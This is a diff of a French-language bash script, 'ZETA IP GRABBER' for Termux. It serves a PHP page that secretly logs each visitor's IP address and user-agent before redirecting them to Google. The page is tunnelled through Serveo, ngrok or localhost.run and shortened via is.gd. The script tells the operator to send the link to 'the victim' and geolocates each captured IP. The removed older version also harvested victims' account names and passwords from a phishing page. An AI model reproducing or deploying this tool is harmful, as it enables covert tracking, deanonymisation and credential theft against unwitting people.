@@ -1,297 +1,285 @@
 #!/bin/bash
 trap 'printf "\n";stop;exit 1' 2
 
+# ======== COULEURS ========
+R='\033[1;91m'
+G='\033[1;92m'
+Y='\033[1;93m'
+B='\033[1;94m'
+P='\033[1;95m'
+C='\033[1;96m'
+W='\033[1;97m'
+N='\033[0m'
+
+# ======== VARIABLES ========
+SERVER="create"
+PORT="3333"
+LOG_FILE="ip_log.txt"
+
+# ======== FONCTIONS ========
 
 dependencies() {
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
-
-}
-
-menu() {
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[1;93mWill You Use This Tool For Good Purpose\e[0m\en"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Yes OR No: \e[0m\en' option
-
-
-if [[ $option == Yes || $option == yes ]]; then
-server="create"
-start1
-
-elif [[ $option == 99 ]]; then
-exit 1
-
-else
-printf "\e[1;93mOk Your not using this tool for good purpose\e[1;93m"
-printf "\e[1;93m[!] Please Accept The Policy!!!\e[0m\n"
-sleep 1
-exit
-fi
+    echo -e "${G}[+]${N} Vérification des dépendances..."
+    
+    command -v php > /dev/null 2>&1 || { 
+        echo -e "${R}[-]${N} PHP n'est pas installé. Installation en cours..."
+        pkg install php -y
+    }
+    
+    command -v curl > /dev/null 2>&1 || { 
+        echo -e "${R}[-]${N} Curl n'est pas installé. Installation en cours..."
+        pkg install curl -y
+    }
+    
+    command -v jq > /dev/null 2>&1 || { 
+        echo -e "${R}[-]${N} jq n'est pas installé. Installation en cours..."
+        pkg install jq -y
+    }
+    
+    echo -e "${G}[+]${N} Toutes les dépendances sont OK !"
 }
 
 stop() {
-
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
-if [[ $checkphp == *'php'* ]]; then
-pkill -f -2 php > /dev/null 2>&1
-killall -2 php > /dev/null 2>&1
-fi
-if [[ $checkssh == *'ssh'* ]]; then
-pkill -f -2 ssh > /dev/null 2>&1
-killall ssh > /dev/null 2>&1
-fi
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-
+    echo -e "${Y}[!]${N} Arrêt des processus..."
+    
+    # Tuer ngrok
+    pkill -f ngrok > /dev/null 2>&1
+    killall ngrok > /dev/null 2>&1
+    
+    # Tuer PHP
+    pkill -f php > /dev/null 2>&1
+    killall php > /dev/null 2>&1
+    
+    # Tuer SSH (Serveo)
+    pkill -f ssh > /dev/null 2>&1
+    killall ssh > /dev/null 2>&1
+    
+    # Nettoyer les fichiers temporaires
+    rm -rf sendlink 2>/dev/null
+    rm -rf iptracker.log 2>/dev/null
+    
+    echo -e "${G}[+]${N} Nettoyage terminé !"
 }
-
-catch_cred() {
-
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
-IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Till The Next Victim To Open Send This Link To Another Person, Press Ctrl + C to exit...\e[0m\n"
-
-}
-
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
-
-if [[ -e iptracker.log ]]; then
-rm -rf iptracker.log
-fi
-
-IFS='\n'
-# send a get request to an API for IP related information
-# and save the information in ./iptracker.log
-curl -s http://ip-api.com/json/$ip?fields=status,continent,query,reverse,country,regionName,city,isp,currency,as | json_pp > ./iptracker.log
-printf "\n"
-
-IFS=$'\n'
-status=$(jq -r .status ./iptracker.log | tr [:upper:] [:lower:])
-if [[ $status == "success" ]]; then
-    continent=$(jq -r .continent ./iptracker.log)
-    if [[ $continent != "" ]]; then
-        printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
-    fi
-    ##
-
-    hostnameip=$(jq -r .query ./iptracker.log)
-    if [[ $hostnameip != "" ]]; then
-        printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
-    fi
-    ##
-
-    reverse_dns=$(jq -r .reverse ./iptracker.log)
-    if [[ $reverse_dns != "" ]]; then
-        printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
-    fi
-    ##
-
-    country=$(jq -r .country ./iptracker.log)
-    if [[ $country != "" ]]; then
-        printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
-    fi
-    ##
-
-    state=$(jq -r .regionName ./iptracker.log)
-    if [[ $state != "" ]]; then
-        printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
-    fi
-    ##
-
-    city=$(jq -r .city ./iptracker.log)
-    if [[ $city != "" ]]; then
-        printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
-    fi
-    ##
-
-    isp=$(jq -r .isp ./iptracker.log)
-    if [[ $isp != "" ]]; then
-        printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
-    fi
-    ##
-
-    as_number=$(jq -r .as ./iptracker.log)
-    if [[ $as_number != "" ]]; then
-        printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
-    fi
-    ##
-
-    ip_currency=$(jq -r .currency ./iptracker.log)
-    if [[ $ip_currency != "" ]]; then
-        printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
-    fi
-    ##
+    ip=$(grep -a 'IP:' sites/$SERVER/ip.txt | cut -d " " -f2 | tr -d '\r')
+    ua=$(grep 'User-Agent:' sites/$SERVER/ip.txt | cut -d '"' -f2)
     
-    printf "\n"
-fi
-rm -rf iptracker.log
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting till the next victim to open the link send to another person, Press Ctrl + C to exit...\e[0m\n"
-
+    echo -e "\n${G}[+]${N} ${B}IP TROUVÉE !${N}"
+    echo -e "${G}[*]${N} IP: ${C}$ip${N}"
+    echo -e "${G}[*]${N} User-Agent: ${C}$ua${N}"
+    
+    # Sauvegarder
+    cat sites/$SERVER/ip.txt >> sites/$SERVER/saved.ip.txt 2>/dev/null
+    
+    # Géolocalisation
+    echo -e "${G}[*]${N} Récupération de la géolocalisation..."
+    curl -s "http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,org,as,timezone" > iptracker.log
+    
+    if [[ -f iptracker.log ]]; then
+        status=$(jq -r .status iptracker.log 2>/dev/null)
+        if [[ $status == "success" ]]; then
+            country=$(jq -r .country iptracker.log 2>/dev/null)
+            region=$(jq -r .regionName iptracker.log 2>/dev/null)
+            city=$(jq -r .city iptracker.log 2>/dev/null)
+            isp=$(jq -r .isp iptracker.log 2>/dev/null)
+            
+            echo -e "${G}[*]${N} Pays: ${C}$country${N}"
+            echo -e "${G}[*]${N} Région: ${C}$region${N}"
+            echo -e "${G}[*]${N} Ville: ${C}$city${N}"
+            echo -e "${G}[*]${N} FAI: ${C}$isp${N}"
+        fi
+        rm -rf iptracker.log
+    fi
+    
+    echo -e "${G}[+]${N} IP sauvegardée dans sites/$SERVER/saved.ip.txt"
+    echo -e "\n${Y}[*]${N} En attente de la prochaine victime... (Ctrl+C pour arrêter)\n"
 }
 
-
-serverx() {
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
-printf "\n"
-sleep 10
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Using urlshortner:\e[0m\e[1;77m %s \n' 
-printf "\n"
-checkfound
-
+# ======== MÉTHODE 1: SERVERO.NET AVEC RACCOURCI ========
+start_serveo() {
+    echo -e "${G}[+]${N} Démarrage du serveur PHP..."
+    cd sites/$SERVER && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+    sleep 2
+    
+    echo -e "${G}[+]${N} Connexion à Serveo.net..."
+    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT serveo.net 2>/dev/null > sendlink &
+    sleep 8
+    
+    # Récupérer le lien
+    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink 2>/dev/null | head -n1)
+    
+    if [[ -z "$send_link" ]]; then
+        echo -e "${R}[-]${N} Impossible de récupérer le lien Serveo automatiquement."
+        echo -e "${Y}[!]${N} Essayez d'ouvrir manuellement:"
+        echo -e "${C}ssh -R 80:localhost:$PORT serveo.net${N}"
+        echo -e "${Y}[*]${N} Puis copiez le lien affiché."
+    else
+        # Raccourcir le lien avec is.gd
+        echo -e "${G}[+]${N} Raccourcissement du lien..."
+        short_link=$(curl -s "https://is.gd/create.php?format=simple&url=$send_link" 2>/dev/null)
+        
+        echo -e "\n${G}[+]${N} ${B}LIEN À ENVOYER À LA VICTIME :${N}"
+        echo -e "${C}Direct: $send_link${N}"
+        
+        if [[ -n "$short_link" ]]; then
+            echo -e "${C}Raccourci: $short_link${N}"
+        else
+            echo -e "${Y}[!]${N} Raccourcissement échoué, utilisez le lien direct."
+        fi
+    fi
+    
+    checkfound
 }
 
-startx() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
-
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
-
-fi
-
-default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
-read port
-port="${port:-${default_port}}"
-serverx
-
+# ======== MÉTHODE 2: NGROK ========
+start_ngrok() {
+    # Télécharger ngrok si absent
+    if [[ ! -f ngrok ]]; then
+        echo -e "${G}[+]${N} Téléchargement de ngrok pour Android..."
+        
+        # Vérifier l'architecture
+        arch=$(uname -m)
+        if [[ $arch == "aarch64" ]] || [[ $arch == "arm64" ]]; then
+            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip
+            unzip -q ngrok-stable-linux-arm64.zip
+            rm -rf ngrok-stable-linux-arm64.zip
+        elif [[ $arch == "arm" ]] || [[ $arch == "armv7l" ]]; then
+            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+            unzip -q ngrok-stable-linux-arm.zip
+            rm -rf ngrok-stable-linux-arm.zip
+        else
+            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
+            unzip -q ngrok-stable-linux-386.zip
+            rm -rf ngrok-stable-linux-386.zip
+        fi
+        chmod +x ngrok
+        echo -e "${G}[+]${N} ngrok téléchargé avec succès !"
+    fi
+    
+    echo -e "${G}[+]${N} Démarrage du serveur PHP..."
+    cd sites/$SERVER && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+    sleep 2
+    
+    echo -e "${G}[+]${N} Démarrage de ngrok..."
+    ./ngrok http $PORT > /dev/null 2>&1 &
+    sleep 8
+    
+    # Récupérer le lien
+    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*ngrok[^"]*' | head -n1)
+    
+    if [[ -z "$link" ]]; then
+        echo -e "${R}[-]${N} Impossible de récupérer le lien ngrok."
+        echo -e "${Y}[!]${N} Vérifiez que ngrok est bien lancé."
+        echo -e "${Y}[*]${N} Ouvrez http://localhost:4040 dans votre navigateur"
+        echo -e "${Y}[*]${N} ou utilisez l'option Serveo à la place."
+    else
+        # Raccourcir le lien
+        echo -e "${G}[+]${N} Raccourcissement du lien..."
+        short_link=$(curl -s "https://is.gd/create.php?format=simple&url=$link" 2>/dev/null)
+        
+        echo -e "\n${G}[+]${N} ${B}LIEN À ENVOYER À LA VICTIME :${N}"
+        echo -e "${C}Direct: $link${N}"
+        
+        if [[ -n "$short_link" ]]; then
+            echo -e "${C}Raccourci: $short_link${N}"
+        fi
+    fi
+    
+    checkfound
 }
 
-
-start() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
-
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
-
-fi
-
-
-
-if [[ -e ngrok ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-
-
-else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
-
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Po 'https:\/\/.+?ngrok[^",]+')
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-checkfound
+# ======== MÉTHODE 3: LOCALHOST.RUN (ALTERNATIVE GRATUITE) ========
+start_localhostrun() {
+    echo -e "${G}[+]${N} Démarrage du serveur PHP..."
+    cd sites/$SERVER && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+    sleep 2
+    
+    echo -e "${G}[+]${N} Connexion à localhost.run..."
+    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT localhost.run 2>/dev/null > sendlink &
+    sleep 8
+    
+    send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink 2>/dev/null | head -n1)
+    
+    if [[ -z "$send_link" ]]; then
+        echo -e "${R}[-]${N} Impossible de récupérer le lien."
+        echo -e "${Y}[!]${N} Essayez: ssh -R 80:localhost:$PORT localhost.run"
+    else
+        echo -e "\n${G}[+]${N} ${B}LIEN À ENVOYER :${N}"
+        echo -e "${C}$send_link${N}"
+    fi
+    
+    checkfound
 }
 
-start1() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-
-
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server == 1 || $option_server == 01 ]]; then
-startx
-
-elif [[ $option_server == 2 || $option_server == 02 ]]; then
-start
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-start1
-fi
-
+# ======== MENU ========
+menu() {
+    clear
+    echo -e "${B}╔════════════════════════════════════════╗${N}"
+    echo -e "${B}║${N}    ${G}🔥 ZETA IP GRABBER v3.0 🔥${N}        ${B}║${N}"
+    echo -e "${B}║${N}    ${C}Pour Termux/Android${N}                ${B}║${N}"
+    echo -e "${B}╚════════════════════════════════════════╝${N}"
+    echo -e ""
+    echo -e "${G}[01]${N} Serveo.net + Raccourci automatique"
+    echo -e "${G}[02]${N} Ngrok + Raccourci automatique"
+    echo -e "${G}[03]${N} localhost.run (alternative)"
+    echo -e "${G}[99]${N} Quitter"
+    echo -e ""
+    read -p "$(echo -e ${G}[?]${N} Choisissez une option: )" choice
+    
+    case $choice in
+        1|01) start_serveo ;;
+        2|02) start_ngrok ;;
+        3|03) start_localhostrun ;;
+        99) echo -e "${R}Au revoir Alpha !${N}"; exit 0 ;;
+        *) echo -e "${R}[!] Option invalide !${N}"; sleep 1; menu ;;
+    esac
 }
+
 checkfound() {
-
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For The Victim To Open The Link,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-while [ true ]; do
-
-
-if [[ -e "sites/$server/ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
-catch_ip
-rm -rf sites/$server/ip.txt
-fi
-done 
-
+    echo -e "\n${Y}[*]${N} En attente des victimes... (Ctrl+C pour arrêter)\n"
+    
+    while true; do
+        if [[ -e "sites/$SERVER/ip.txt" ]]; then
+            echo -e "\n${G}[+]${N} IP trouvée !"
+            catch_ip
+            rm -rf sites/$SERVER/ip.txt
+        fi
+        sleep 1
+    done
 }
 
-dependencies
-menu
+# ======== CRÉATION DU DOSSIER SITES ========
+setup_sites() {
+    mkdir -p sites/$SERVER
+    
+    # Créer un fichier PHP qui capture l'IP
+    cat > sites/$SERVER/index.php << 'EOF'
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$date = date('Y-m-d H:i:s');
 
+$log = "[$date] IP: $ip | User-Agent: $user_agent\n";
+file_put_contents('ip.txt', $log, FILE_APPEND);
+
+header('Location: https://www.google.com');
+exit;
+?>
+EOF
+    
+    echo -e "${G}[+]${N} Site de capture prêt dans sites/$SERVER/"
+}
+
+# ======== MAIN ========
+main() {
+    dependencies
+    setup_sites
+    menu
+}
+
+# ======== EXÉCUTION ========
+main
